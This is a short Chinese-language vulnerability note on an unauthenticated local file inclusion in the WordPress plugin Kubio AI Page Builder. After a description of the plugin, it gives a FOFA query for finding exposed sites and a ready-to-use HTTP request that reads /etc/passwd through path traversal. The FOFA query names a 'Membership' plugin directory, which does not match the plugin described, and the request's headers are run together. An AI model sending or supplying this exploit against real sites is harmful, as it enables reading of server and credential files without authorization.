## WordPress 任意文件读取漏洞

## 一、漏洞简介
Kubio Al Page Builder 是 WordPress 平台上一款基于人工智能的现代化建站工具插件，专为无代码用户和开发者设计。该插件深度融合AI生成技术，提供拖拽式可视化编辑器，支持智能布局建议、实时内容生成和自动化设计优化，用户可通过自然语言指令快速生成响应式网页、区块模板和动态内容。其特色在于与 WordPress 原生编辑器 Gutenberg 深度整合，提供 100+ 预制模板库、高级版式控件和WooCommerce 电商模块，同时通过 A| 学习用户设计偏好实现个性化推荐，显著降低建站门槛，尤其适合中小企业和个人创作者快速构建专业级网站，兼顾设计自由度与开发效率Kubio Al Page Builder 插件存在未授权本地文件包含漏洞，未经身份验证攻击者可通过该漏洞包含读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa
```
body="wp-content/plugins/Membership"
```

## POC
```
GET /?__kubio-site-edit-iframe-preview=1&__kubio-site-edit-iframe-classic-template=../../../../../../../../etc/passwd HTTP/1.1Host: accept: */*User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9
```
